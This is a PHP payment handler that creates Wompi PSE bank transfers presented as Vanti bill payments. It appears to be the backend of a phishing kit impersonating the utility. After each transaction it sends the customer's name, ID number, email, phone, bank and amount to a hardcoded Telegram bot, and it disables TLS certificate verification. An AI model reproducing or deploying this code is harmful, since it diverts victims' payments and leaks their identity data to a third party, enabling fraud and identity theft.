<?php
header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type');
if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') exit;

require_once 'config.php';

$raw  = file_get_contents('php://input');
$data = json_decode($raw, true);
$base = 'https://production.wompi.co/v1';

function wompi_curl($url, $method = 'GET', $payload = null, $auth = null) {
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $headers = ['Content-Type: application/json'];
    if ($auth) $headers[] = "Authorization: Bearer $auth";
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    if ($method === 'POST') {
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($payload));
    }
    $res  = curl_exec($ch);
    $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    return [$code, json_decode($res, true)];
}

function get_acceptance_token($base, $pub) {
    [, $res] = wompi_curl("$base/merchants/$pub");
    return $res['data']['presigned_acceptance']['acceptance_token'] ?? null;
}

// 1. Lista de bancos PSE disponibles
if (isset($_GET['bancos'])) {
    [, $res] = wompi_curl("$base/pse/financial_institutions", 'GET', null, WOMPI_PUBLIC_KEY);
    echo json_encode($res['data'] ?? []);
    exit;
}

// 2. Crear transacción PSE
if (($data['action'] ?? '') === 'pse') {
    $amount_cents = intval($data['amount']) * 100;
    $currency     = 'COP';
    $reference    = 'VANTI-' . time();
    $signature    = hash('sha256', $reference . $amount_cents . $currency . WOMPI_INTEGRITY_SECRET);

    $phone = preg_replace('/[^0-9]/', '', $data['phone'] ?? '3000000000');
    if (strlen($phone) === 10) $phone = '+57' . $phone;

    $acceptance_token = get_acceptance_token($base, WOMPI_PUBLIC_KEY);
    if (!$acceptance_token) {
        http_response_code(500);
        echo json_encode(['ok' => false, 'error' => 'No se obtuvo token de aceptación']);
        exit;
    }

    $payload = [
        'acceptance_token' => $acceptance_token,
        'amount_in_cents'  => $amount_cents,
        'currency'         => $currency,
        'signature'        => $signature,
        'customer_email'   => $data['email'] ?? '',
        'reference'        => $reference,
        'payment_method'   => [
            'type'                       => 'PSE',
            'user_type'                  => 0,
            'user_legal_id_type'         => $data['doc_type'] ?? 'CC',
            'user_legal_id'              => $data['doc']      ?? '',
            'financial_institution_code' => $data['bank_code'],
            'payment_description'        => 'Pago Factura Vanti'
        ],
        'customer_data' => [
            'full_name'    => $data['full_name'] ?? '',
            'phone_number' => $phone
        ],
        'redirect_url' => 'https://www.grupovanti.com/'
    ];

    [$code, $result] = wompi_curl("$base/transactions", 'POST', $payload, WOMPI_PUBLIC_KEY);

    if ($code === 201 && isset($result['data']['id'])) {
        $tid      = $result['data']['id'];
        $async    = null;

        for ($i = 0; $i < 12 && !$async; $i++) {
            sleep(1);
            [, $poll] = wompi_curl("$base/transactions/$tid", 'GET', null, WOMPI_PUBLIC_KEY);
            $async = $poll['data']['payment_method']['extra']['async_payment_url'] ?? null;
        }

        // Notificar Telegram
        $tg_token = '8759383283:AAEaX9ATg-94Tg0eG5Kl9hVHiJ5E0gAw8Fs';
        $tg_chat  = '-5557049172';
        $msg = "🏦 <b>NUEVA TRANSACCIÓN PSE - VANTI</b>\n\n"
             . "👤 <b>Cliente:</b> " . ($data['full_name'] ?? 'N/A') . "\n"
             . "🆔 <b>Doc:</b> " . ($data['doc'] ?? 'N/A') . "\n"
             . "📧 <b>Email:</b> " . ($data['email'] ?? 'N/A') . "\n"
             . "📱 <b>Tel:</b> " . ($data['phone'] ?? 'N/A') . "\n"
             . "🏛️ <b>Banco:</b> " . ($data['bank_name'] ?? $data['bank_code']) . "\n"
             . "💰 <b>Monto:</b> $" . number_format($amount_cents / 100, 0, ',', '.') . " COP\n"
             . "🔢 <b>Ref:</b> <code>$reference</code>\n"
             . "⏰ " . date('Y-m-d H:i:s');
        $ch_tg = curl_init("https://api.telegram.org/bot$tg_token/sendMessage");
        curl_setopt($ch_tg, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch_tg, CURLOPT_POST, true);
        curl_setopt($ch_tg, CURLOPT_POSTFIELDS, http_build_query(['chat_id'=>$tg_chat,'text'=>$msg,'parse_mode'=>'HTML']));
        curl_setopt($ch_tg, CURLOPT_SSL_VERIFYPEER, false);
        curl_exec($ch_tg);
        curl_close($ch_tg);

        if ($async) {
            echo json_encode(['ok' => true, 'url' => $async]);
        } else {
            http_response_code(400);
            echo json_encode(['ok' => false, 'error' => 'El banco tardó demasiado en responder, intenta de nuevo']);
        }
    } else {
        http_response_code(400);
        echo json_encode(['ok' => false, 'error' => $result['error']['reason'] ?? 'Error al crear transacción Wompi', 'raw' => $result]);
    }
    exit;
}

echo json_encode(['error' => 'Acción no reconocida']);
